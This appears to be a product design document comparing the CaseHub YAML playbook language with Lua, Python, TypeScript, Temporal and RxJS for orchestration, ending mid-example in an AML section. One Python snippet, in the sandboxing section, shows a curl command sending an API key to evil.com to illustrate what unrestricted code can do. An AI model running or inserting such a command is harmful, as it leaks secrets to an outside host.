# CaseHub Playbook Language — Advantage Analysis

A systematic comparison of the CaseHub YAML playbook language against
imperative alternatives (Lua, Python, TypeScript) across real-world
orchestration use cases. Each category shows what the playbook expresses,
the equivalent imperative code, and where the advantage lies.

### Honesty Policy

This document tries to be fair. Where the YAML has a genuine advantage,
we show it. Where the comparison is close or where frameworks in the
imperative world narrow the gap, we say so. Where the YAML hides
complexity (runtime, plugins, deployment), we acknowledge it.

The imperative comparisons aim for idiomatic, framework-assisted code —
not deliberately verbose strawmen. When a library (Temporal, RxJS,
asyncio.TaskGroup) is the real competition, we compare against it, not
against raw from-scratch implementations.

The YAML playbook language is not universally better than code. It
occupies a specific niche — declarative orchestration for mixed
audiences — and we make the case for that niche honestly.

---

## Category 1: Progressive Disclosure

**What it is:** A new user can write their first playbook in 30 seconds.
Advanced features appear only when needed — the language doesn't front-load
complexity.

### Use Case 1.1: First Playbook

**CaseHub YAML:**
```yaml
steps:
  - action: send-email
    to: customer
```

**Python equivalent:**
```python
from casehub import Playbook, Step

pb = Playbook("my-first")

@pb.step
def send_email(ctx):
    email_service.send(ctx.params["to"])

pb.run()
```

**Advantage:** Zero imports, zero boilerplate, zero framework concepts.
The YAML IS the program. A non-programmer reads it and understands it
instantly. The Python version requires understanding imports, decorators,
context objects, and service references before writing "send email."

**Honest caveat:** The YAML simplicity hides a substantial runtime — a
YAML parser, step resolver, decorator chain, plugin system, and execution
scope. Someone built all of that. The advantage is that the playbook
*author* doesn't see it, not that it doesn't exist. A vanilla Python
script (`import smtplib; send(...)`) is also 2 lines — the difference
is that the YAML version gains retry, timeout, and resource management
by adding words, while the Python version requires importing libraries.

### Use Case 1.2: Adding Retry (Six Months Later)

**CaseHub YAML:**
```yaml
steps:
  - action: send-email
    to: customer
    retry: 3
```

**Python equivalent:**
```python
from casehub import Playbook, Step
from tenacity import retry, stop_after_attempt

pb = Playbook("my-first")

@pb.step
@retry(stop=stop_after_attempt(3))
def send_email(ctx):
    email_service.send(ctx.params["to"])

pb.run()
```

**Advantage:** The user added one word (`retry: 3`) to something they
already understood. No new import, no new decorator syntax, no new
library to learn. In Python, retry requires a third-party library
(tenacity), a new decorator, and understanding of its API.

---

## Category 2: Composition Without Complexity

**What it is:** Multiple behaviors compose on a single step via
orthogonal decorators. Each decorator is independent — adding one
doesn't affect the others.

### Use Case 2.1: Nine Decorators on One Step

**CaseHub YAML:**
```yaml
- action: process-claim
  at: >=100 pending-claims
  loop: continuous
  cancel: end-of-day
  resource: claims-api
  priority: high
  background: true
  retry: { max: 3, on: [TIMEOUT, RATE_LIMITED] }
  timeout: 30s
```

**Lua equivalent:**
```lua
local function process_claims()
    while not signals.end_of_day do
        if counters.pending_claims < 100 then
            coroutine.yield()  -- wait for threshold
        end

        local acquired = resource_pool:acquire("claims-api", PRIORITY_HIGH)
        if not acquired then
            coroutine.yield()
        end

        local ok, err
        for attempt = 1, 3 do
            ok, err = pcall(function()
                with_timeout(30, function()
                    process_claim()
                end)
            end)
            if ok then break end
            if err.category ~= "TIMEOUT" and err.category ~= "RATE_LIMITED" then
                break  -- don't retry permanent errors
            end
        end

        resource_pool:release("claims-api")
    end
end

coroutine.wrap(process_claims)()  -- background
```

**Advantage:** The YAML reads as a specification — nine independent
concerns declared as annotations. The Lua version interleaves nine
concerns into one control flow, creating a 25-line function where each
concern is tangled with the others. Changing the retry policy in YAML
means changing one line. In Lua, it means understanding the entire
function to know where retry logic lives.

### Use Case 2.2: Decorator Ordering is Guaranteed

**CaseHub YAML:**
```yaml
- action: call-api
  timeout: 30s
  retry: 3
```

**Question:** Does timeout apply per-retry or to all retries combined?

**Answer (YAML):** Per-retry. The decorator chain ordering is fixed:
timeout (position 7) is inside retry (position 10). This is guaranteed
by the language — the user doesn't choose, and can't get it wrong.

**Python equivalent:**
```python
@retry(stop=stop_after_attempt(3))
@timeout(30)
def call_api():
    ...
```

In Python, decorator ordering depends on stacking order, which the user
must get right. `@retry(@timeout)` and `@timeout(@retry)` have different
semantics, and both compile. The YAML eliminates this class of bug.

---

## Category 3: Concurrency Without Threads

**What it is:** Background execution, resource contention, and
priority-based scheduling — expressed declaratively, without the user
managing threads, locks, or coroutines.

### Use Case 3.1: Background Task with Priority Yielding

**CaseHub YAML:**
```yaml
resources:
  minerals: { concurrency: 1 }

steps:
  - train: PROBE
    loop: continuous
    resource: minerals
    priority: background
    background: true

  - build: PYLON
    at: 14 supply
    resource: minerals
    priority: high
```

**TypeScript equivalent:**
```typescript
const mineralsLock = new Mutex();
let running = true;

// Background probe production
const probeLoop = async () => {
  while (running) {
    await mineralsLock.acquire();
    try {
      await trainUnit("PROBE");
    } finally {
      mineralsLock.release();
    }
    await sleep(0); // yield to event loop
  }
};

// Main build order
const buildOrder = async () => {
  await waitUntil(() => supply >= 14);
  // How do we prioritize this over probeLoop?
  // Mutex doesn't support priority. Need a PriorityMutex.
  await mineralsLock.acquire();
  try {
    await buildStructure("PYLON");
  } finally {
    mineralsLock.release();
  }
};

Promise.all([probeLoop(), buildOrder()]);
```

**Lua equivalent:**
```lua
-- Priority resource contention in Lua
local minerals_queue = {}  -- manual priority queue
local minerals_held = false

local function acquire_minerals(priority, thread)
    if not minerals_held then
        minerals_held = true
        return true
    end
    table.insert(minerals_queue, { priority = priority, thread = thread })
    table.sort(minerals_queue, function(a, b)
        return a.priority > b.priority
    end)
    coroutine.yield()  -- block until released
    return true
end

local function release_minerals()
    if #minerals_queue > 0 then
        local next = table.remove(minerals_queue, 1)
        minerals_held = true
        coroutine.resume(next.thread)  -- wake highest priority
    else
        minerals_held = false
    end
end

-- Background probe production
local probe_loop = coroutine.create(function()
    while true do
        acquire_minerals(0, coroutine.running())  -- BACKGROUND = 0
        train_unit("PROBE")
        release_minerals()
        coroutine.yield()  -- yield to scheduler
    end
end)

-- Main build order
local build_order = coroutine.create(function()
    while supply < 14 do
        coroutine.yield()  -- poll supply
    end
    acquire_minerals(2, coroutine.running())  -- HIGH = 2
    build_structure("PYLON")
    release_minerals()
end)

-- Manual scheduler — must be written by the user
local function run_scheduler()
    while true do
        if coroutine.status(probe_loop) ~= "dead" then
            coroutine.resume(probe_loop)
        end
        if coroutine.status(build_order) ~= "dead" then
            coroutine.resume(build_order)
        end
        if coroutine.status(build_order) == "dead" then break end
    end
end

run_scheduler()
```

**Advantage:** The YAML expresses "PROBE yields to PYLON when both
need minerals" as `priority: background` vs `priority: high`.

**Honest caveat on the Lua comparison:** The Lua version builds a
scheduler from scratch, which is unfair — real Lua game scripting uses
engine frameworks (LÖVE, Defold, Roblox) that provide task scheduling,
timers, and basic resource management. With a framework, the Lua version
would be shorter. However, NO Lua game framework provides priority-aware
resource contention — that specific feature genuinely doesn't exist in
the ecosystem. The core advantage (priority composition) holds even
against framework-assisted Lua.

The TypeScript version has the same gap — standard `Mutex` doesn't
support priority.

The YAML user doesn't know `PriorityOrcSemaphore` exists — they just
wrote `priority: high`. That's the real advantage: the infrastructure
is substantial (someone built it), but the author never sees it.

### Use Case 3.1b: The Workflow Framework Comparison (Temporal)

The skeptic's strongest counter: "Use a workflow framework, not raw code."
Fair point. Here's the same use case in Temporal — the leading workflow
orchestration framework.

**Temporal (Python SDK):**
```python
from temporalio import workflow, activity
from datetime import timedelta

@activity.defn
async def train_probe():
    await game.train("PROBE")

@activity.defn
async def build_pylon():
    await game.build("PYLON")

@workflow.defn
class BuildOrder:
    @workflow.run
    async def run(self):
        # Background probe production
        probe_task = workflow.start_activity(
            train_probe,
            start_to_close_timeout=timedelta(seconds=30),
            retry_policy=RetryPolicy(maximum_attempts=3),
        )
        # But: how do we loop it continuously?
        # Temporal activities are one-shot. Continuous loop requires
        # a child workflow or a signal-based re-trigger pattern:

        while True:
            await workflow.start_activity(
                train_probe,
                start_to_close_timeout=timedelta(seconds=30),
            )
            # No priority concept. No resource contention.
            # Temporal schedules activities on worker pools, not
            # priority queues. "PROBE yields to PYLON" is not
            # expressible without custom queue routing.

            if await workflow.wait_condition(
                lambda: self.supply >= 14, timeout=timedelta(seconds=1)
            ):
                break
```

**Honest comparison with Temporal:**

| Concern | CaseHub YAML | Temporal |
|---------|-------------|----------|
| Continuous loops | `loop: continuous` | While-loop in workflow code |
| Priority contention | `priority: background/high` | Not built-in — custom task queues |
| Threshold gates | `at: 14 supply` | `wait_condition()` with polling |
| Cancellation | `cancel: signal-name` | `CancellationScope` (similar concept) |
| Retry | `retry: { on: [TIMEOUT] }` | `RetryPolicy` (similar, well-designed) |
| Background tasks | `background: true` | Child workflows / async activities |
| Non-programmer authoring | YAML — no code | Python/Go/Java — code required |
| Auditability | YAML diffable, schema-validated | Code — requires code review |

**Where Temporal is better:** Production reliability (durable execution,
replay, versioning), ecosystem maturity, observability tooling.

**Where YAML is better:** No-code authoring, priority-aware resource
contention, threshold-gated execution, auditability for compliance,
progressive disclosure (Temporal front-loads workflow/activity concepts).

**Bottom line:** Temporal is the strongest competition for developer
audiences. The YAML wins when the audience includes non-programmers or
when compliance auditability is a requirement. Temporal wins when you
need durable execution across machine failures, which the YAML runtime
does not currently address.

### Use Case 3.2: Cancellable Background Group

**CaseHub YAML:**
```yaml
- block:
    cancel: army-phase
    steps:
      - train: PROBE
        loop: continuous
        resource: nexus
        background: true
      - build: PYLON
        loop: continuous
        at: supply-blocked
        background: true

- action: signal-transition
  at: >=22 workers
  signal: army-phase
```

**TypeScript equivalent:**
```typescript
const controller = new AbortController();
let running = true;

const probeLoop = async () => {
  while (running) {
    if (controller.signal.aborted) break;
    await acquireResource("nexus");
    try {
      await trainUnit("PROBE");
    } finally {
      releaseResource("nexus");
    }
  }
};

const pylonLoop = async () => {
  while (running) {
    if (controller.signal.aborted) break;
    await waitUntil(() => isSupplyBlocked());
    await buildStructure("PYLON");
  }
};

// Cancellation watcher
const cancelWatcher = async () => {
  await waitUntil(() => workerCount >= 22);
  controller.abort();  // signal both loops
  running = false;
};

// Must compose manually — and AbortController doesn't
// interrupt in-progress async operations (only checked between awaits)
await Promise.race([
  Promise.all([probeLoop(), pylonLoop()]),
  cancelWatcher(),
]);
// Are resources cleaned up? Depends on whether the loops
// were between awaits when abort fired.
```

**Python equivalent:**
```python
import asyncio

class ProductionGroup:
    def __init__(self):
        self.cancel_event = asyncio.Event()
        self._tasks: list[asyncio.Task] = []

    async def probe_loop(self):
        while not self.cancel_event.is_set():
            # No priority concept — asyncio has no built-in priority
            await train_unit("PROBE")
            await asyncio.sleep(0)  # yield

    async def pylon_loop(self):
        while not self.cancel_event.is_set():
            if is_supply_blocked():
                await build_structure("PYLON")
            await asyncio.sleep(0.1)  # poll

    async def cancel_watcher(self):
        while worker_count < 22:
            await asyncio.sleep(0.1)  # poll — no event-driven threshold
        self.cancel_event.set()
        for task in self._tasks:
            task.cancel()  # cancels, but CancelledError must be caught
            # If task is mid-build, what happens to the half-built pylon?

    async def run(self):
        self._tasks = [
            asyncio.create_task(self.probe_loop()),
            asyncio.create_task(self.pylon_loop()),
        ]
        cancel_task = asyncio.create_task(self.cancel_watcher())
        try:
            await asyncio.gather(*self._tasks, cancel_task)
        except asyncio.CancelledError:
            pass  # swallowed — is this logged? audited?
```

**Lua equivalent:**
```lua
local cancel_token = false
local production_coroutines = {}

local probe_loop = coroutine.create(function()
    while not cancel_token do
        if nexus_available() then
            train_unit("PROBE")
        end
        coroutine.yield()
    end
    -- cleanup? what cleanup? coroutine just stops.
    -- if we were mid-train, the unit is in an undefined state.
end)

local pylon_loop = coroutine.create(function()
    while not cancel_token do
        if is_supply_blocked() then
            build_structure("PYLON")
        end
        coroutine.yield()
    end
end)

table.insert(production_coroutines, probe_loop)
table.insert(production_coroutines, pylon_loop)

-- Cancellation watcher — separate coroutine
local cancel_watcher = coroutine.create(function()
    while true do
        if worker_count >= 22 then
            cancel_token = true  -- signal all loops to stop
            -- But they only check on next iteration.
            -- If probe_loop is mid-train, it finishes first.
            -- No cascading scope close. No guaranteed cleanup.
            break
        end
        coroutine.yield()
    end
end)

-- Scheduler must run all of these
local function run()
    while true do
        for _, co in ipairs(production_coroutines) do
            if coroutine.status(co) ~= "dead" then
                coroutine.resume(co)
            end
        end
        coroutine.resume(cancel_watcher)
        if cancel_token then break end
    end
end
```

**Advantage:** An entire production group cancelled by a single signal.
The `cancel:` on the block cascades to all children — the runtime
interrupts spawned tasks, releases resources in finally blocks, and
closes child scopes. The Lua version uses a shared mutable boolean
(`cancel_token`) that each coroutine must check manually. If a coroutine
is mid-operation when the token flips, it finishes that operation before
checking — no immediate cancellation. No resource cleanup guarantees.
No cascading scope close. The YAML expresses "stop all of this when
that happens" in one line; the Lua requires 50+ lines of manual
coordination.

---

## Category 4: Safe by Construction

**What it is:** Entire classes of bugs are impossible in the YAML
language because the grammar doesn't permit them.

### Use Case 4.1: No Arbitrary Code Execution

**CaseHub YAML:**
```yaml
- action: process-payment
  amount: ${order.total}
  retry: { max: 3, on: [TIMEOUT] }
```

**What the user CAN'T do:**
- Import `os` and run shell commands
- Access the filesystem
- Make arbitrary network requests
- Leak secrets via logging
- Introduce infinite recursion
- Create memory leaks via closures

**Python equivalent can do ALL of these:**
```python
@pb.step
def process_payment(ctx):
    os.system("curl http://evil.com?secret=" + ctx.secrets["api_key"])
    # Nothing prevents this
```

**Advantage:** The YAML playbook is sandboxed by grammar. A compliance
officer can audit a YAML playbook and know EXACTLY what it can do —
because the language can't express anything else. Auditing Python code
requires understanding every import, every library, and every possible
side effect.

**Honest caveat:** The sandbox applies to playbook *authors*, not the
*system*. The plugins that steps invoke (`action: process-payment`) are
Java/TS code with full system access. A malicious or buggy plugin can
do everything the Python example does. The security boundary is: "the
person writing YAML can't cause harm beyond what the plugin set allows."
This is meaningful — it's the difference between auditing 10 plugins
written by developers vs. auditing every playbook written by anyone —
but it's not a full sandbox.

### Use Case 4.2: Resource Cleanup is Guaranteed

**CaseHub YAML:**
```yaml
- action: process-item
  resource: database-pool
  timeout: 30s
```

The resource is ALWAYS released — whether the step succeeds, fails,
times out, or is cancelled. This is guaranteed by the decorator chain's
`finally` blocks. The user can't forget to release a resource because
they never acquired one — the decorator handles the lifecycle.

**Python equivalent (bad — manual):**
```python
pool = await db_pool.acquire()
try:
    result = await asyncio.wait_for(process_item(), timeout=30)
finally:
    db_pool.release(pool)  # User must remember this
```

**Python equivalent (good — idiomatic):**
```python
async with db_pool.acquire() as conn:
    result = await asyncio.wait_for(process_item(conn), timeout=30)
# cleanup guaranteed by context manager — same safety as YAML
```

**Honest assessment:** Idiomatic Python with `async with` provides the
same cleanup guarantee as the YAML decorator. The YAML advantage here
is NOT safety — it's that the user doesn't need to know context managers
exist. They write `resource: database-pool` and the lifecycle is handled.
A junior Python developer might write the bad version; the YAML user
can't, because there is no manual version to get wrong.

### Use Case 4.3: Conditional Retry Prevents Harmful Retries

**CaseHub YAML:**
```yaml
- action: authenticate-user
  retry: { max: 3, on: [TIMEOUT, TRANSIENT] }
```

**What this prevents:** Retrying authentication with wrong credentials
(which triggers account lockout). The `on: [TIMEOUT, TRANSIENT]` means
only transient failures are retried. A `PERMANENT` failure (wrong
password) propagates immediately.

**Python equivalent (common — unconditional retry):**
```python
@retry(max_attempts=3)
def authenticate(user, password):
    return auth_service.login(user, password)
# Retries wrong passwords → account locked after 3 attempts
```

**Python equivalent (correct — conditional retry with tenacity):**
```python
from tenacity import retry, retry_if_exception_type, stop_after_attempt

@retry(
    stop=stop_after_attempt(3),
    retry=retry_if_exception_type((TimeoutError, TransientError)),
)
def authenticate(user, password):
    return auth_service.login(user, password)
```

**Honest assessment:** Python CAN do conditional retry with tenacity's
`retry_if_exception_type`. The YAML advantage is: the conditional retry
is first-class (one line: `on: [TIMEOUT, TRANSIENT]`), discoverable via
schema completions, and the categories are standardised across all
plugins. In Python, each library has its own exception hierarchy and
each retry decorator has its own filter API.

---

## Category 5: Static Analysability

**What it is:** The YAML playbook can be validated, analysed, and
assisted by tools without executing it.

### Use Case 5.1: LSP / IDE Completions

**CaseHub YAML with JSON Schema:**
```yaml
- action: process-order
  re|  # ← cursor here
```

The IDE offers: `resource`, `retry`, `repeat`. Each with documentation,
type constraints, and valid values. This works because `StepSchemaComposer`
emits a JSON Schema with every decorator key, typed constraints, and
enum values.

**Lua equivalent:** No completions. The decorator is just a string key
in a table. The IDE doesn't know what keys are valid.

**Advantage:** Zero-cost tooling. The schema IS the documentation, the
validation, and the completion source. No language server to build, no
type stubs to maintain.

### Use Case 5.2: Offline Validation

**CaseHub YAML:**
```yaml
- action: build
  resource: minerls    # ← typo
  priority: high
```

Parse-time error: "Unknown resource 'minerls'. Declared resources:
minerals, gas, nexus." The playbook never executes — the error is
caught at parse time.

**Lua equivalent:** Runtime error after the step tries to acquire a
resource that doesn't exist. Discovered in production, not in the
editor.

### Use Case 5.3: Diffable and Auditable

```diff
- retry: 3
+ retry: { max: 3, on: [TIMEOUT] }
```

A one-line diff tells the reviewer exactly what changed: retry policy
now only retries timeouts.

**Python diff for the same change:**
```diff
+ from tenacity import retry, retry_if_exception_type, stop_after_attempt
  
- @retry(max_attempts=3)
+ @retry(
+     stop=stop_after_attempt(3),
+     retry=retry_if_exception_type((TimeoutError,)),
+ )
  def authenticate(user, password):
```

7 lines changed across imports and decorator. A reviewer must understand
tenacity's `retry_if_exception_type` API to verify the change is correct.
The YAML diff is self-documenting.

---

## Category 6: Stream Processing as Composition

**What it is:** Multi-stage data pipelines emerge from composing
existing primitives — no stream DSL needed.

### Use Case 6.1: IoT Sensor Pipeline

**CaseHub YAML:**
```yaml
# Stage 1: Ingest
- action: read-sensor
  forEach: { in: sensors, as: sensor }
  loop: continuous
  delay: 30s
  background: true
  publish: { channel: raw-readings }

# Stage 2: Enrich (with retry)
- action: enrich-reading
  from: { channel: raw-readings, as: reading }
  retry: { max: 3, on: [TRANSIENT] }
  loop: continuous
  background: true
  publish: { channel: enriched }

# Stage 3: Alert (rate-limited, filtered)
- action: send-alert
  from: { channel: enriched, as: reading, filter: "${reading.severity} >= WARNING" }
  resource: alert-api
  priority: high
  loop: continuous
  background: true
```

**Java Streams equivalent (unfair comparison — Streams is a collection API, not a stream processing framework):**
```java
sensorReadings.stream()
    .map(r -> enrichService.enrich(r))      // no retry
    .filter(r -> r.getSeverity() >= WARNING) // no rate limiting
    .forEach(r -> alertService.send(r));     // no backpressure
```

**RxJS equivalent (the real competition):**
```typescript
import { from, interval, mergeMap, filter, retry, tap } from 'rxjs';

interval(30_000).pipe(
  mergeMap(() => from(sensors).pipe(
    mergeMap(sensor => readSensor(sensor)),
  )),
  mergeMap(reading => enrichReading(reading).pipe(
    retry({ count: 3, delay: 1000 }),
  )),
  filter(enriched => enriched.severity >= WARNING),
  tap(enriched => sendAlert(enriched)),
  // But: no per-stage resource contention
  // No priority between stages
  // No cancellation by named signal
  // Backpressure via mergeMap concurrency limit (partial)
).subscribe();
```

**Honest assessment:** RxJS closes much of the gap — it has per-stage
retry, filtering, and basic backpressure via concurrency limits. The
YAML advantage narrows to: per-stage resource contention (`resource:`),
priority (`priority:`), named signal cancellation (`cancel:`), and
readability for non-programmers. For a developer audience, RxJS is
competitive. For a mixed audience (developers + ops + compliance),
the YAML wins on auditability.

Java Streams is NOT the right comparison — it's a collection API, not
a stream processing framework. Kafka Streams, Project Reactor, and
RxJS are the real competition and should be acknowledged.

### Use Case 6.2: Fan-Out with Conditional Routing

**CaseHub YAML:**
```yaml
- action: classify-event
  from: raw-events
  loop: continuous
  background: true
  publish:
    - { channel: normal, if: "${result.class} == NORMAL" }
    - { channel: anomaly, if: "${result.class} == ANOMALY" }
    - { channel: critical, if: "${result.severity} >= CRITICAL" }
```

**RxJS equivalent:**
```typescript
classify$.pipe(
  tap(event => {
    if (event.class === 'NORMAL') normalSubject.next(event);
    if (event.class === 'ANOMALY') anomalySubject.next(event);
    if (event.severity >= CRITICAL) criticalSubject.next(event);
  }),
).subscribe();
```

**Python equivalent:**
```python
async for event in classify_stream:
    result = await classify(event)
    if result["class"] == "NORMAL":
        await normal_queue.put(result)
    if result["class"] == "ANOMALY":
        await anomaly_queue.put(result)
    if result["severity"] >= CRITICAL:
        await critical_queue.put(result)
```

**Honest assessment:** The imperative versions are readable and not
much longer. The YAML advantage is modest here — inline conditional
routing vs. explicit if-statements. The real benefit is consistency:
the fan-out uses the same `publish:` / `from:` channel pattern as
everything else in the playbook. A non-programmer scans the `publish:`
list and understands the routing without knowing what a Subject or
asyncio queue is.

---

## Category 7: Portability and Interchange

**What it is:** YAML playbooks are data — storable, transmittable,
versionable, and executable on any runtime.

### Use Case 7.1: Multi-Runtime Execution

The same YAML playbook runs on:
- **Java runtime** (yaml-step-runtime, virtual threads, j.u.c primitives)
- **TypeScript runtime** (pages, Node.js event loop, Promise-based)
- **Future runtimes** (Go, Rust, WASM — the YAML is the spec)

**Code equivalent:** None — this is a property of data formats, not code.
Temporal workflows are tied to their SDK language (Python, Go, Java, TS).
Airflow DAGs are Python-only. The YAML's runtime-independence is a
structural advantage of choosing a data format over a programming language.

**Honest caveat:** "Write once, run anywhere" requires each runtime to
implement the full decorator chain identically. Behavioural parity across
runtimes is hard to maintain — subtle differences in concurrency, timing,
or error handling can cause the same YAML to behave differently. This is
the classic portability problem, not a solved one.

### Use Case 7.2: UI-Generated Playbooks

A drag-and-drop workflow builder generates YAML. The user never writes
YAML directly — they connect visual blocks. The YAML is the serialisation
format between the UI and the runtime.

**Code equivalent:** Tools like Node-RED and n8n generate workflows from
visual builders using JSON, not code. AWS Step Functions uses a JSON DSL
(Amazon States Language) for the same purpose. So YAML is not unique
here — any data-format DSL supports UI generation.

**YAML advantage over JSON DSLs:** YAML is human-editable. A user can
open the generated file, read it, modify it, and commit it. JSON/ASL
is technically editable but practically hostile to hand-editing. The
YAML sits at the sweet spot: machine-generatable AND human-readable.

### Use Case 7.3: LLM-Generated Playbooks

An LLM can generate valid YAML playbooks from natural language:

> "Monitor temperature sensors every 30 seconds. If any reading exceeds
> 80 degrees, send an alert. Rate-limit alerts to 1 per minute."

```yaml
- action: read-temperature
  forEach: { in: sensors, as: sensor }
  loop: continuous
  delay: 30s
  background: true
  publish: { channel: readings }

- action: send-alert
  from: { channel: readings, filter: "${from.temperature} > 80" }
  resource: alert-api
  loop: continuous
  background: true
```

**What an LLM generates for the same prompt in Python:**
```python
import asyncio
import aiohttp

async def monitor_sensors(sensors, threshold=80):
    alert_semaphore = asyncio.Semaphore(1)  # rate limit? not really
    last_alert_time = 0

    async def read_sensor(sensor):
        async with aiohttp.ClientSession() as session:
            # Which endpoint? What auth? What timeout?
            resp = await session.get(sensor.url)
            return await resp.json()

    while True:
        tasks = [read_sensor(s) for s in sensors]
        readings = await asyncio.gather(*tasks)
        for reading in readings:
            if reading["temperature"] > threshold:
                now = time.time()
                if now - last_alert_time >= 60:  # rate limit
                    await send_alert(reading)
                    last_alert_time = now
        await asyncio.sleep(30)
```

**Honest assessment:** The Python is plausible but fragile — an LLM might
forget the rate limit, use the wrong async pattern, or leave the session
open. The YAML has a constrained output space (JSON Schema contract), so
correctness is verifiable. The Python output space is unbounded — the LLM
can generate syntactically valid Python that is semantically wrong in ways
a schema can't catch.

---

## Category 8: FSI Trading Bots — Compliance by Construction

**What it is:** Financial services trading bots must be auditable by
compliance, explainable to regulators, and provably bounded. The YAML
language makes these properties structural, not aspirational.

### Use Case 8.1: Auditable Trade Execution Strategy

**CaseHub YAML:**
```yaml
resources:
  trading-api: { concurrency: 1 }
  risk-engine: { concurrency: 3 }

steps:
  # Continuous market monitoring
  - action: monitor-market
    from: { channel: market-data, as: tick }
    loop: continuous
    background: true
    publish: { channel: signals }

  # Signal processing with risk gate
  - action: evaluate-signal
    from: { channel: signals, as: signal, filter: "${signal.strength} >= 0.7" }
    resource: risk-engine
    loop: continuous
    background: true
    publish: { channel: trade-decisions }

  # Trade execution — rate-limited, risk-gated, auditable
  - action: execute-trade
    from: { channel: trade-decisions, as: decision }
    if: "${decision.within-risk-limits}"
    resource: trading-api
    priority: high
    retry: { max: 2, on: [TIMEOUT, RATE_LIMITED] }
    cancel: market-close
    loop: continuous
    background: true
```

**Python equivalent (typical quant bot):**
```python
import asyncio
import ccxt
import numpy as np
from typing import Optional
from dataclasses import dataclass

class TradingBot:
    def __init__(self, exchange: ccxt.Exchange, risk_manager: RiskManager):
        self.exchange = exchange
        self.risk = risk_manager
        self.running = True
        self._positions_lock = asyncio.Lock()
        self._api_semaphore = asyncio.Semaphore(1)

    async def monitor_market(self):
        while self.running:
            try:
                ticker = await self.exchange.fetch_ticker("BTC/USD")
                signal = self.strategy.evaluate(ticker)
                if signal and signal.strength >= 0.7:
                    await self.process_signal(signal)
            except Exception as e:
                logger.error(f"Market monitor error: {e}")
            await asyncio.sleep(1)

    async def process_signal(self, signal):
        async with self._positions_lock:
            risk_check = await self.risk.evaluate(signal)
            if not risk_check.within_limits:
                logger.warning(f"Risk limit breached: {risk_check.reason}")
                return  # silent skip — no audit trail

            await self.execute_trade(signal)

    async def execute_trade(self, signal):
        for attempt in range(3):
            try:
                async with self._api_semaphore:
                    order = await asyncio.wait_for(
                        self.exchange.create_order(
                            signal.symbol, "limit", signal.side,
                            signal.amount, signal.price),
                        timeout=30)
                    return order
            except asyncio.TimeoutError:
                continue  # retry on timeout
            except ccxt.InsufficientFunds:
                break  # DON'T retry — but is this logged?
            except ccxt.RateLimitExceeded:
                await asyncio.sleep(2 ** attempt)
                continue
            except Exception as e:
                logger.error(f"Trade failed: {e}")
                break  # unknown error — should we retry?

    async def run(self):
        await asyncio.gather(
            self.monitor_market(),
            # What if monitor_market crashes? Does it restart?
            # What happens on KeyboardInterrupt?
            # Are positions cleaned up?
        )
```

**Compliance advantage — point by point:**

| Concern | YAML | Python |
|---------|------|--------|
| **What can it trade?** | Only what `action: execute-trade` plugin allows | `self.exchange` exposes every API method — withdraw, transfer, cancel-all |
| **When does it stop?** | `cancel: market-close` — explicit, auditable | `self.running = True` — mutable flag, set from anywhere, or not at all |
| **What does it retry?** | `on: [TIMEOUT, RATE_LIMITED]` — explicit allow-list | `except` blocks — reviewer must trace every exception path |
| **Rate limiting?** | `resource: trading-api, concurrency: 1` — guaranteed | `asyncio.Semaphore(1)` — correct, but user must remember to use it everywhere |
| **Risk gate?** | `if: "${decision.within-risk-limits}"` — step won't execute without it | `if not risk_check.within_limits: return` — can be commented out, bypassed, or forgotten |
| **Audit trail?** | Every step execution is logged by the runtime (step name, decorators, result, timing) | Manual `logger.error()` calls — incomplete, inconsistent, forgettable |
| **Side effects?** | Only what the plugin allows | `import os; os.system(...)` — no sandbox |

### Use Case 8.2: MiFID II Best Execution Compliance

MiFID II requires firms to demonstrate they achieved "best execution"
for client orders. This means proving: the order was routed optimally,
the execution venue was selected correctly, and the timing was
appropriate.

**CaseHub YAML:**
```yaml
resources:
  venue-a: { concurrency: 5 }
  venue-b: { concurrency: 5 }
  venue-c: { concurrency: 3 }

steps:
  # Price discovery across venues — parallel, collected
  - action: query-price
    forEach: { in: ${var.venues}, as: venue, collect: all, parallel: true }
    timeout: 2s
    retry: { max: 1, on: [TIMEOUT] }

  # Best execution selection — deterministic, auditable
  - action: select-best-venue
    # Plugin applies best-execution algorithm
    # Input: collected prices. Output: selected venue + justification

  # Execution on selected venue
  - action: execute-order
    resource: "${result.select-best-venue.venue}"
    priority: high
    retry: { max: 2, on: [TIMEOUT, RATE_LIMITED] }
    timeout: 5s

  # Compliance record — always runs, even on failure
  - action: record-execution-report
    # MiFID II RTS 28 execution report
```

**Python equivalent (FIX protocol, typical quant desk):**
```python
import asyncio
from typing import List

async def best_execution(order, venues: List[Venue]):
    # Query all venues in parallel
    price_tasks = [venue.query_price(order) for venue in venues]
    prices = await asyncio.gather(*price_tasks, return_exceptions=True)
    # But: what if one venue times out? asyncio.gather with
    # return_exceptions returns the exception object — the caller
    # must filter successes from failures manually.

    successful = [(v, p) for v, p in zip(venues, prices)
                   if not isinstance(p, Exception)]

    if not successful:
        # All venues failed — is this logged? Retried?
        raise NoVenueAvailableError()

    # Best execution selection
    best = min(successful, key=lambda vp: vp[1].price)
    venue, price = best

    # Execute — retry on timeout
    for attempt in range(3):
        try:
            result = await asyncio.wait_for(
                venue.execute(order, price), timeout=5)
            break
        except asyncio.TimeoutError:
            if attempt == 2:
                raise
        except OrderRejectedException:
            raise  # don't retry rejections — but is this documented?

    # Compliance record — but if execute() throws, this never runs
    try:
        await record_execution_report(order, venue, result)
    except Exception:
        logger.error("Failed to record execution report")
        # REGULATORY VIOLATION: MiFID II RTS 28 report not filed
```

**Why the YAML is better for compliance:**

1. **The price discovery is provably parallel and complete** — `forEach`
   with `collect: all` and `parallel: true` means every venue was queried.
   A reviewer can see this in the YAML without reading code. The Python
   uses `asyncio.gather` which mixes exceptions with results — the
   filtering logic is manual and easy to get wrong.

2. **The best execution selection is a single, named step** — the
   algorithm lives in the plugin, but the FACT that it was called and
   its output determined the venue is visible in the playbook structure.
   In Python, it's `min(successful, key=...)` — one line buried in a
   50-line function.

3. **Retry policy is venue-appropriate** — `retry: { on: [TIMEOUT] }`
   means we retry connectivity issues, not rejections. The Python version
   catches `OrderRejectedException` separately but only because the
   developer remembered to — the language doesn't enforce it.

4. **The execution report always runs** — it's a subsequent step, not
   inside a try/catch that might be skipped. The Python has the report
   in a `try` that swallows its own failure with a log — a regulatory
   violation hidden behind `logger.error`.

### Use Case 8.3: AML Transaction Monitoring

**CaseHub YAML:**
```yaml
steps:
  # Continuous transaction monitoring
  - action: score-transaction
    from: { channel: transactions, as: txn }
    loop: continuous
    background: true
    publish:
      - { channel: normal, if: "${result.risk-score} < 0.5" }
      - { channel: review, if: "${result.risk-score} >= 0.5" }
      - { channel: escalate, if: "${result.risk-score} >= 0.9" }

  # Automatic review queue
  - action: enrich-transaction
